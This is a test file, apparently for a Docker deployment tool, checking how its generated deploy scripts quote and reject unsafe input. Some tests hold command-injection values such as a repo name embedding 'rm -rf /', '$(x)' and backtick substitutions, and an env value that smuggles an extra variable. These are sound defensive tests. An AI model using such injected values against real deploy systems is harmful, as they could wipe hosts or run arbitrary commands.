    const s = buildRunScript({ ...base, env: { ZED: "z\n", ALPHA: "a\n" }, envMeta: { ZED: { multiline: true }, ALPHA: { multiline: true } } }, "v1", true);
    expect(s).toContain('env ALPHA="$TUGRA_ML_0" ZED="$TUGRA_ML_1" docker run -d');
    expect(s).toContain("-e ALPHA -e ZED");
  });

  it("an unflagged value with a line break throws (the shared-variable injection regression), naming the key only", () => {
    expect(() => buildRunScript({ ...base, env: { SHARED_K: "x\nINJECTED=1" } }, "v1", true)).toThrow(/"SHARED_K" contains a line break but is not marked multiline/);
  });

  it("a host-affecting key can never be multiline, even if stored flags say so", () => {
    expect(() => buildRunScript({ ...base, env: { LD_PRELOAD: "a\nb" }, envMeta: { LD_PRELOAD: { multiline: true } } }, "v1", true)).toThrow(/cannot be a multiline/);
  });

  it("preflight: fails above 120 KiB, only when multiline transport is in use", () => {
    const huge = { ...base, env: { PEM_KEY: "x".repeat(16 * 1024), A: "y".repeat(110 * 1024) }, envMeta: { PEM_KEY: { multiline: true } } } as AppSpec;
    expect(() => buildRunScript(huge, "v1", true)).toThrow(/deploy script is \d+ bytes; limit 122880/);
    // the same oversize env WITHOUT multiline keeps today's behaviour (no new cap)
    expect(() => buildRunScript({ ...huge, envMeta: undefined, env: { A: "y".repeat(110 * 1024) } }, "v1", true)).not.toThrow();
  });

  describe("build flags", () => {
    const git: AppSpec = { ...base, image: undefined, source: "GIT", gitUrl: "https://github.com/a/b.git", gitBranch: "main", buildType: "DOCKERFILE", env: {} } as AppSpec;
    it("a flagged value rides --build-arg on DOCKERFILE and STATIC, --env on nixpacks/railpack/heroku", () => {
      const f = { buildArgs: { NEXT_PUBLIC_X: "v 1" }, buildFlagKeys: ["NEXT_PUBLIC_X"] };
      expect(buildRunScript({ ...git, ...f }, "v1", true)).toContain("--build-arg 'NEXT_PUBLIC_X=v 1'");
      expect(buildRunScript({ ...git, ...f, buildType: "STATIC" }, "v1", true)).toContain("--build-arg 'NEXT_PUBLIC_X=v 1'");
      for (const bt of ["NIXPACKS", "RAILPACK", "HEROKU"] as const) {
        expect(buildRunScript({ ...git, ...f, buildType: bt }, "v1", true)).toContain("--env 'NEXT_PUBLIC_X=v 1'");
      }
    });
    it("the TUGRA_BUILD_ENV marker names keys only; the sensitive warning is DOCKERFILE/STATIC only", () => {
      const f = { buildArgs: { API_TOKEN: "TOPSECRETVALUE", PLAIN: "p" }, buildFlagKeys: ["API_TOKEN", "PLAIN"] };
      const d = buildRunScript({ ...git, ...f }, "v1", true);
      expect(d).toContain("TUGRA_BUILD_ENV: 2 variable(s) passed to the build (Build time flag): API_TOKEN, PLAIN");
      expect(d).toContain("WARNING - build variables are baked into the image history (docker history); use Build secrets for secrets: API_TOKEN");
      expect(d.match(/echo [^\n]*/g)!.filter((l) => l.includes("TUGRA_BUILD_ENV") || l.includes("WARNING")).join("")).not.toContain("TOPSECRETVALUE");
      expect(buildRunScript({ ...git, ...f, buildType: "NIXPACKS" }, "v1", true)).not.toContain("WARNING - build variables");
    });
    it("a build-secret collision is echoed by key name", () => {
      const s = buildRunScript({ ...git, buildFlagDropped: ["NPM_TOKEN"] }, "v1", true);
      expect(s).toContain("TUGRA: build variable NPM_TOKEN ignored - a build secret with the same name exists");
    });
    it("no flagged build keys: no note at all (byte-identical)", () => {
      expect(buildRunScript(git, "v1", true)).not.toContain("TUGRA_BUILD_ENV");
      expect(buildRunScript({ ...git, buildFlagKeys: [] }, "v1", true)).toBe(buildRunScript(git, "v1", true));
    });
    it("rollback (build=false) skips all build notes", () => {
      expect(buildRunScript({ ...git, buildFlagKeys: ["A"], buildArgs: { A: "1" } }, "v1", false)).not.toContain("TUGRA_BUILD_ENV");
    });
    it("an explicit SOURCE_COMMIT build arg still wins over the commit injection", () => {
      const s = buildRunScript({ ...git, sourceCommitMode: "BUILD", buildArgs: { SOURCE_COMMIT: "mine" }, buildFlagKeys: ["SOURCE_COMMIT"] }, "v1", true);
      expect(s).toContain("--build-arg 'SOURCE_COMMIT=mine'");
      expect(s).not.toContain('--build-arg "SOURCE_COMMIT=$TUGRA_C"');
    });
  });
});

describe("custom container labels (D5)", () => {
  const gate = { retries: 1, intervalSec: 1, startPeriodSec: 0 };
  const dom: AppSpec = { ...base, domain: "app.example.com" };
  const labels = { team: "core", env: "prod" };

  it("null / {} / undefined customLabels leave every builder byte-identical", () => {
    for (const cl of [null, {}, undefined]) {
      expect(buildRunScript({ ...dom, customLabels: cl }, "v1", true)).toBe(buildRunScript(dom, "v1", true));
      expect(buildRollingDeployScript({ ...dom, customLabels: cl }, "v1", { probe: { kind: "stableWait" }, ...gate })).toBe(
        buildRollingDeployScript(dom, "v1", { probe: { kind: "stableWait" }, ...gate }),
      );
      expect(buildRecreateDeployScript({ ...base, hostPort: 8080, customLabels: cl }, "v1", { probe: { kind: "stableWait" }, ...gate })).toBe(
        buildRecreateDeployScript({ ...base, hostPort: 8080 }, "v1", { probe: { kind: "stableWait" }, ...gate }),
      );
    }
  });

  it("emits sorted --label tokens AFTER dockerOptions and BEFORE Tugra's own labels / alias / image ref", () => {
    const s = buildRunScript({ ...dom, containerAlias: "web", dockerOptions: "--memory-reservation=64m", customLabels: { team: "core", env: "prod" } }, "v1", false);
    const iOpts = s.indexOf("'--memory-reservation=64m'");
    const iEnv = s.indexOf("--label 'env=prod'");
    const iTeam = s.indexOf("--label 'team=core'");
    const iNet = s.indexOf("--network tugra-proxy --label 'traefik.enable=true'");
    const iAlias = s.indexOf("--label 'tugra.alias=web'");
    const iRef = s.indexOf("'tugra_abc:v1'");
    expect(iOpts).toBeGreaterThan(-1);
    expect(iEnv).toBeGreaterThan(iOpts);
    expect(iTeam).toBeGreaterThan(iEnv);
    expect(iNet).toBeGreaterThan(iTeam);
    expect(iAlias).toBeGreaterThan(iNet);
    expect(iRef).toBeGreaterThan(iAlias);
  });

  it("keeps $, backtick, quote, space and an empty value literal through shq", () => {
    const s = buildRunScript({ ...base, customLabels: { a: "x $HOME `id` 'q' \"d\"", b: "" } }, "v1", false);
    expect(s).toContain("--label 'a=x $HOME `id` '\\''q'\\'' \"d\"'");
    expect(s).toContain("--label 'b='");
  });

  it("a reserved key in a stored row fails closed at build time", () => {
    expect(() => buildRunScript({ ...base, customLabels: { "traefik.enable": "true" } }, "v1", false)).toThrow(/reserved/);
    expect(() => buildRunScript({ ...base, customLabels: { "Tugra.role": "gpu-probe" } }, "v1", false)).toThrow(/reserved/);
  });

  it("hard-cutover, rolling (rollout + canonical relabel), recreate and rollback all carry the labels", () => {
    const hard = buildRunScript({ ...base, customLabels: labels }, "v1", true);
    expect(hard).toContain("--label 'team=core'");
    const rollback = buildRunScript({ ...base, customLabels: labels }, "old1", false);
    expect(rollback).toContain("--label 'team=core'");
    const rolling = buildRollingDeployScript({ ...dom, customLabels: labels }, "v1", { probe: { kind: "stableWait" }, ...gate });
    expect((rolling.match(/--label 'team=core'/g) ?? []).length).toBeGreaterThanOrEqual(1);
    const recreate = buildRecreateDeployScript({ ...base, hostPort: 8080, customLabels: labels }, "v1", { probe: { kind: "stableWait" }, ...gate });
    expect(recreate).toContain("--label 'env=prod'");
  });

  it("the pre-deploy hook container carries no labels", () => {
    const git: AppSpec = { ...base, source: "GIT", gitUrl: "https://github.com/x/y", buildType: "DOCKERFILE", preDeployCommand: "migrate", customLabels: labels };
    const s = buildRunScript(git, "v1", true);
    const hook = s.slice(s.indexOf("docker run --rm"), s.indexOf("TUGRA_PREDEPLOY: failed"));
    expect(hook).toContain("docker run --rm");
    expect(hook).not.toContain("--label");
  });

  describe("classicTugraLabelLines / classicAliasLabelLine", () => {
    it("is empty without a domain", () => {
      expect(classicTugraLabelLines(base)).toEqual([]);
    });
    it("matches traefikLabels for a plain domain app (no pin)", () => {
      expect(classicTugraLabelLines(dom)).toEqual(traefikLabels(dom));
    });
    it("appends the proxy-network pin with dbNetwork or extra networks", () => {
      expect(classicTugraLabelLines({ ...dom, dbNetwork: true }).slice(-1)).toEqual(["traefik.docker.network=tugra-proxy"]);
      expect(classicTugraLabelLines({ ...dom, networks: ["shared"] }).slice(-1)).toEqual(["traefik.docker.network=tugra-proxy"]);
    });
    it("the run line renders exactly these lines", () => {
      const app = { ...dom, dbNetwork: true, containerAlias: "web" };
      const s = buildRunScript(app, "v1", false);
      for (const l of classicTugraLabelLines(app)) expect(s).toContain(`--label '${l}'`);
      expect(s).toContain(`--label '${classicAliasLabelLine(app)}'`);
    });
    it("alias line needs an alias and a Tugra-managed network", () => {
      expect(classicAliasLabelLine(base)).toBeNull();
      expect(classicAliasLabelLine({ ...base, containerAlias: "web" })).toBe("tugra.alias=web"); // no domain -> tugra-apps
      expect(classicAliasLabelLine({ ...base, containerAlias: "web", dockerOptions: "--network host" })).toBeNull();
    });
  });
});

describe("custom pushed image name + alias tag (D4 feature A)", () => {
  const auth = { url: "ghcr.io", user: "bot", token: "s3cr3t" };
  const gitApp: AppSpec = { ...base, source: "GIT", image: null, gitUrl: "https://x/r.git", gitBranch: "main", buildType: "DOCKERFILE" };

  it("registryImageRef uses a custom name, a nested name, trims slashes, falls back to the username", () => {
    expect(registryImageRef({ url: "ghcr.io", imagePrefix: "myorg" }, { id: "abc", pushImageName: "web" }, "v1")).toBe("ghcr.io/myorg/web:v1");
    expect(registryImageRef({ url: "ghcr.io", imagePrefix: "myorg" }, { id: "abc", pushImageName: "team/api" }, "v1")).toBe("ghcr.io/myorg/team/api:v1");
    expect(registryImageRef({ url: "reg.example.com/", imagePrefix: "team/" }, { id: "abc", pushImageName: "web" }, "v2")).toBe("reg.example.com/team/web:v2");
    expect(registryImageRef({ url: null, imagePrefix: null, username: "me" }, { id: "abc", pushImageName: "web" }, "v1")).toBe("me/web:v1"); // Docker Hub namespace fallback
    // null / undefined / "" name -> the default repo, byte-identical to today
    for (const name of [null, undefined, ""]) {
      expect(registryImageRef({ url: "ghcr.io", imagePrefix: "myorg" }, { id: "abc", pushImageName: name }, "v1")).toBe("ghcr.io/myorg/tugra_abc:v1");
    }
  });

  it("buildRegistryPushSteps without an alias is the exact legacy output", () => {
    const legacy = [
      "docker tag tugra_abc:v1 'ghcr.io/org/tugra_abc:v1'",
      ...registryLoginPrelude(auth),
      "docker push 'ghcr.io/org/tugra_abc:v1'",
      ...registryLogoutSteps(auth),
    ];
    expect(buildRegistryPushSteps("tugra_abc:v1", "ghcr.io/org/tugra_abc:v1", auth)).toEqual(legacy);
    expect(buildRegistryPushSteps("tugra_abc:v1", "ghcr.io/org/tugra_abc:v1", auth, undefined)).toEqual(legacy);
  });

  it("a literal alias emits the exact ordered sequence (tag, alias tag, login, push both, rmi, marker, logout)", () => {
    const steps = buildRegistryPushSteps("tugra_abc:v1", "ghcr.io/org/web:v1", auth, { parts: ["latest"] });
    expect(steps).toEqual([
      "docker tag tugra_abc:v1 'ghcr.io/org/web:v1'",
      "TUGRA_ALIAS='ghcr.io/org/web:latest'",
      'docker tag tugra_abc:v1 "$TUGRA_ALIAS"',
      ...registryLoginPrelude(auth),
      "docker push 'ghcr.io/org/web:v1'",
      'docker push "$TUGRA_ALIAS" || { echo "TUGRA_REGISTRY_ALIAS: push failed ($TUGRA_ALIAS) - the immutable tag was pushed; registries with immutable tags reject a moving alias, clear the alias tag to avoid this"; docker rmi "$TUGRA_ALIAS" >/dev/null 2>&1 || true; docker --config "$sd" logout \'ghcr.io\' || true; exit 1; }',
      'docker rmi "$TUGRA_ALIAS" >/dev/null 2>&1 || true',
      'echo "TUGRA_REGISTRY_ALIAS: pushed $TUGRA_ALIAS"',
      ...registryLogoutSteps(auth),
    ]);
    expect(steps.join("\n")).not.toContain("TUGRA_SHA12");
  });

  it("an alias with {sha} guards the unknown commit BEFORE any login and splices $TUGRA_SHA12 outside the quotes", () => {
    const steps = buildRegistryPushSteps("tugra_abc:v1", "ghcr.io/org/web:v1", auth, { parts: ["main-", "-x"] });
    const i = (needle: string) => steps.findIndex((l) => l.includes(needle));
    expect(steps[1]).toBe('TUGRA_SHA12=$(printf %s "$TUGRA_C" | cut -c1-12)');
    expect(steps[2]).toBe('[ -n "$TUGRA_SHA12" ] || { echo "TUGRA: the alias tag needs the commit sha but it is unknown"; exit 1; }');
    expect(steps[3]).toBe(`TUGRA_ALIAS='ghcr.io/org/web:main-'"$TUGRA_SHA12"'-x'`);
    expect(i("TUGRA_SHA12=")).toBeLessThan(i("login"));
    expect(i("docker push 'ghcr.io/org/web:v1'")).toBeLessThan(i('docker push "$TUGRA_ALIAS"'));
    expect(i('docker push "$TUGRA_ALIAS"')).toBeLessThan(steps.indexOf('docker rmi "$TUGRA_ALIAS" >/dev/null 2>&1 || true'));
  });

  it("the alias failure branch removes the local alias, logs out and exits 1; no registry auth -> no logout in it", () => {
    const failLine = buildRegistryPushSteps("l:v", "r/a:v", auth, { parts: ["x"] }).find((l) => l.startsWith('docker push "$TUGRA_ALIAS"'))!;
    expect(failLine).toContain('docker rmi "$TUGRA_ALIAS"');
    expect(failLine).toContain("logout");
    expect(failLine.endsWith("exit 1; }")).toBe(true);
  });

  it("shq()s a hostile repo/alias value so it can never break out of the assignment", () => {
    const steps = buildRegistryPushSteps("tugra_abc:v1", "ghcr.io/o'; rm -rf /; '/web:v1", auth, { parts: ["a"] });
    expect(steps.find((l) => l.startsWith("TUGRA_ALIAS="))).toBe(`TUGRA_ALIAS='ghcr.io/o'\\''; rm -rf /; '\\''/web:a'`);
  });

  it("prepSteps (GIT) pushes the alias too, after the build and before the clone cleanup", () => {
    const s = buildRunScript({ ...gitApp, registryPush: { auth, tag: "ghcr.io/org/web:v1", alias: { parts: ["main-", ""] } } }, "v1");
    expect(s.indexOf("docker build")).toBeLessThan(s.indexOf("TUGRA_ALIAS="));
    expect(s.indexOf('docker push "$TUGRA_ALIAS"')).toBeLessThan(s.indexOf("rm -rf /etc/tugra/builds/abc\n"));
    expect(s).toContain('TUGRA_SHA12=$(printf %s "$TUGRA_C"');
  });

  it("an IMAGE app re-push carries a literal alias (no TUGRA_C needed)", () => {
    const s = buildBuildOnlyScript({ ...base, registryPush: { auth, tag: "ghcr.io/org/web:v1", alias: { parts: ["stable"] } } }, "v1");
    expect(s).toContain("TUGRA_ALIAS='ghcr.io/org/web:stable'");
    expect(s).not.toContain("TUGRA_SHA12");
  });

  it("with no alias the GIT build script is byte-identical to the legacy push", () => {
    const a = buildRunScript({ ...gitApp, registryPush: { auth, tag: "ghcr.io/org/tugra_abc:v1" } }, "v1");
    const b = buildRunScript({ ...gitApp, registryPush: { auth, tag: "ghcr.io/org/tugra_abc:v1", alias: undefined } }, "v1");
    expect(a).toBe(b);
    expect(a).not.toContain("TUGRA_ALIAS");
  });
});

describe("buildImageRemoveScriptForTags with ownedVersions (custom pushed name)", () => {
  const owned = new Set(["cdep1", "cdep2"]);

  it("legacy inputs are byte-identical with or without the third argument", () => {
    const tags = ["tugra_abc:v1", "ghcr.io/org/tugra_abc:v1", "nginx:latest"];
    expect(buildImageRemoveScriptForTags("abc", tags, owned)).toBe(buildImageRemoveScriptForTags("abc", tags));
    expect(buildImageRemoveScriptForTags("abc", ["nginx:latest"], owned)).toBe("exit 0");
  });

  it("a custom-name tag is kept ONLY when its version is one of the app's deployment ids", () => {
    const tag = "ghcr.io/org/web:cdep1";
    expect(buildImageRemoveScriptForTags("abc", [tag])).toBe("exit 0"); // no ownedVersions -> dropped (legacy)
    const s = buildImageRemoveScriptForTags("abc", [tag, "ghcr.io/org/web:cdep2"], owned);
    expect(s).toContain("docker rmi 'ghcr.io/org/web:cdep1'");
    expect(s).toContain("docker rmi 'ghcr.io/org/web:cdep2'");
    expect(s).not.toContain("rmi -f");
  });

  it("drops nginx:latest, a foreign repo with a non-owned version, and shell metacharacters", () => {
    const s = buildImageRemoveScriptForTags(
      "abc",
      ["nginx:latest", "ghcr.io/org/web:cother", "repo;rm -rf /:cdep1", "ghcr.io/o$(x)/web:cdep1", "UPPER/web:cdep1", "ghcr.io/org/web", "web:cdep1:"],
      owned,
    );
    expect(s).toBe("exit 0");
  });

  it("accepts a registry host with a port and a bare custom name", () => {
    const s = buildImageRemoveScriptForTags("abc", ["localhost:5000/ns/web:cdep1", "web:cdep2"], owned);
    expect(s).toContain("'localhost:5000/ns/web:cdep1'");
    expect(s).toContain("'web:cdep2'");
  });
});

describe("inline Dockerfile (D4 feature D)", () => {
  const BD = "/etc/tugra/builds/abc";
  const IP = "/etc/tugra/builds/abc.Dockerfile";
  const gitApp: AppSpec = { ...base, source: "GIT", image: null, gitUrl: "https://x/r.git", gitBranch: "main", buildType: "DOCKERFILE" };
  const text = "FROM alpine:3.20\nRUN echo 'it''s'\n";

  it("with the field null/unset the script is byte-identical to the repository-Dockerfile build", () => {
    const plain = buildRunScript(gitApp, "v1");
    expect(buildRunScript({ ...gitApp, inlineDockerfile: null }, "v1")).toBe(plain);
    expect(plain).toContain(`docker build -t tugra_abc:v1 -f '${BD}/Dockerfile' ${BD}`);
    expect(plain).not.toContain(".Dockerfile");
  });

  it("writes the text OUTSIDE the clone (sibling path), rm -f first, umask 077, base64, and builds with -f of that path", () => {
    const s = buildRunScript({ ...gitApp, dockerfilePath: "docker/Dockerfile", dockerBuildTarget: "prod", buildArgs: { A: "1" }, inlineDockerfile: text }, "v1");
    const lines = s.split("\n");
    const w = lines.findIndex((l) => l === `rm -f '${IP}'`);
    expect(w).toBeGreaterThan(-1);
    expect(lines[w + 1]).toBe(`( umask 077; printf %s '${Buffer.from(text).toString("base64")}' | base64 -d > '${IP}' )`);
    const build = lines[w + 2];
    expect(build).toBe(`docker build --target 'prod' --build-arg 'A=1' -t tugra_abc:v1 -f '${IP}' ${BD} || { rc=$?; rm -f '${IP}'; exit $rc; }`);
    expect(lines[w + 3]).toBe(`rm -f '${IP}'`); // after a successful build
    expect(s).not.toContain("docker/Dockerfile"); // the repo path is not used while inline is active
    expect(s.indexOf(IP)).toBeLessThan(s.indexOf(`rm -rf ${BD}\n`)); // the sibling is not the clone dir
    expect(IP.startsWith(`${BD}/`)).toBe(false);
  });

  it("keeps the secrets, the commit arg and installs no second trap", () => {
    const s = buildRunScript(
      { ...gitApp, sourceCommitMode: "BUILD", buildSecrets: { TOKEN: "x" }, inlineDockerfile: text },
      "v1",
    );
    expect(s).toContain("DOCKER_BUILDKIT=1 docker build");
    expect(s).toContain('--build-arg "SOURCE_COMMIT=$TUGRA_C"');
    expect(s).toContain('--secret id=TOKEN,src="$sd/bs_TOKEN"');
    expect((s.match(/trap '/g) ?? []).length).toBe((buildRunScript({ ...gitApp, sourceCommitMode: "BUILD", buildSecrets: { TOKEN: "x" } }, "v1").match(/trap '/g) ?? []).length);
  });

  it("applies to every deploy path that prepares the build (build-only script) and a monorepo base", () => {
    const s = buildBuildOnlyScript({ ...gitApp, baseDirectory: "apps/api", inlineDockerfile: text }, "v1");
    expect(s).toContain(`-f '${IP}' ${BD}/apps/api`);
  });

  it("only the DOCKERFILE build type consults it", () => {
    const s = buildRunScript({ ...gitApp, buildType: "NIXPACKS", inlineDockerfile: text }, "v1");
    expect(s).not.toContain(".Dockerfile");
  });

  it("asserts the script fits when an inline Dockerfile is set (oversized text trips the guard)", () => {
    expect(() => buildRunScript({ ...gitApp, inlineDockerfile: "FROM alpine\n" + "# x\n".repeat(60_000) }, "v1")).toThrow();
  });

  it("the delete cleanup removes the sibling file ONLY when an inline Dockerfile is set", () => {
    expect(buildRemoveScript({ id: "abc" })).toContain("rm -rf /etc/tugra/builds/abc /etc/tugra/builds/abc.plan.json\n".trimEnd());
    expect(buildRemoveScript({ id: "abc" })).not.toContain(".Dockerfile");
    expect(buildRemoveScript({ id: "abc", inlineDockerfile: text })).toContain("rm -rf /etc/tugra/builds/abc /etc/tugra/builds/abc.plan.json /etc/tugra/builds/abc.Dockerfile");
  });
});

describe("soak default + first-deploy guard (real bash, stub docker)", () => {
  const bashOk = spawnSync("bash", ["-c", "echo ok"]).stdout?.toString().trim() === "ok";
  const d = bashOk ? describe : describe.skip;
  const app: AppSpec = { ...({ id: "abc", name: "n", source: "IMAGE", image: "nginx", containerPort: 80, domain: "app.example.com" } as unknown as AppSpec) };
  const gate = { retries: 3, intervalSec: 3, startPeriodSec: 0 };

  it("DEFAULT_POST_CUTOVER_SOAK_SEC is 30 and only COMPOSE defaults to 0", () => {
    expect(DEFAULT_POST_CUTOVER_SOAK_SEC).toBe(30);
    expect(defaultSoakFor("IMAGE")).toBe(30);
    expect(defaultSoakFor("GIT")).toBe(30);
    expect(defaultSoakFor("COMPOSE")).toBe(0);
  });

  it("schema.prisma and the migration agree with DEFAULT_POST_CUTOVER_SOAK_SEC", () => {
    const schema = readFileSync(join(__dirname, "../../prisma/schema.prisma"), "utf8");
    const m = /postCutoverSoakSec\s+Int\s+@default\((\d+)\)/.exec(schema);
    expect(Number(m?.[1])).toBe(DEFAULT_POST_CUTOVER_SOAK_SEC);
    const sql = readFileSync(join(__dirname, "../../prisma/migrations/20261119095000_app_soak_default_on/migration.sql"), "utf8");
    const ddl = sql.split("\n").filter((l) => !l.trim().startsWith("--")).join("\n");
    expect(Number(/ALTER COLUMN "postCutoverSoakSec" SET DEFAULT (\d+)/.exec(ddl)?.[1])).toBe(DEFAULT_POST_CUTOVER_SOAK_SEC);
    expect(sql).toContain("existing rows are deliberately NOT backfilled");
    expect(ddl).not.toMatch(/UPDATE/i);
  });

  d("exec", () => {
    let dir: string;
    beforeAll(() => {
      dir = mkdtempSync(join(tmpdir(), "tugra-soak-"));
      // docker stub: `inspect` fails for __prev unless HAVE_PREV=1; the health probe (`run --rm`) prints 200 until the
      // rollout was renamed into place, then 500 (so any post-cutover probe fails). Everything else succeeds.
      writeFileSync(
        join(dir, "docker"),
        [
          "#!/bin/bash",
          'echo "docker $*" >> "$LOG"',
          'case "$1" in',
          '  inspect) case "$*" in *__prev*) [ "$HAVE_PREV" = 1 ] && exit 0 || exit 1;; esac; echo true; exit 0;;',
          '  run) case "$*" in *"--rm"*) if [ -f "$FLAG" ]; then echo 500; else echo 200; fi;; esac; exit 0;;',
          '  rename) case "$2" in *__rollout) touch "$FLAG";; esac; exit 0;;',
          "esac",
          "exit 0",
        ].join("\n") + "\n",
      );
      writeFileSync(join(dir, "sleep"), '#!/bin/bash\necho "sleep $*" >> "$LOG"\nexit 0\n');
      chmodSync(join(dir, "docker"), 0o755);
      chmodSync(join(dir, "sleep"), 0o755);
    });
    afterAll(() => rmSync(dir, { recursive: true, force: true }));
    const exec = (script: string, havePrev: boolean) => {
      const log = join(dir, "log");
      const flag = join(dir, "flag");
      writeFileSync(log, "");
      rmSync(flag, { force: true });
      const r = spawnSync("bash", ["-c", script], {
        env: { PATH: `${dir}:${process.env.PATH}`, LOG: log, FLAG: flag, HAVE_PREV: havePrev ? "1" : "0" },
        encoding: "utf8",
      });
      return { status: r.status, out: r.stdout, log: readFileSync(log, "utf8") };
    };
    const script = (soakSec: number) =>
      buildRollingDeployScript(app, "v2", { build: false, probe: { kind: "httpExternal", port: 80, path: "/" }, soak: { windowSec: soakSec, intervalSec: 3 }, ...gate });
    const soakSleeps = (log: string) => log.split("\n").filter((l) => l === "sleep 3").length;

    it("a first-ever deploy (no __prev) finishes healthy without waiting out the soak window", () => {
      const r = exec(script(30), false);
      expect(r.out).toContain("TUGRA_ROLLOUT: healthy");
      expect(r.status).toBe(0);
      expect(r.out).not.toContain("post-cutover soak: watching");
      expect(r.out).not.toContain("soak_failed_no_prev");
      // the only `sleep 3` calls are the pre-cutover gate's, never the 10-iteration soak loop
      expect(soakSleeps(r.log)).toBeLessThan(10);
    });

    it("with a __prev the watch runs the full loop (a sustained 500 after cutover reverts, exit 4)", () => {
      const r = exec(script(30), true);
      expect(r.out).toContain("post-cutover soak: watching the new version for 30s");
      expect(r.out).toContain("TUGRA_ROLLOUT: reverted");
      expect(r.status).toBe(4);
    });
  });
});
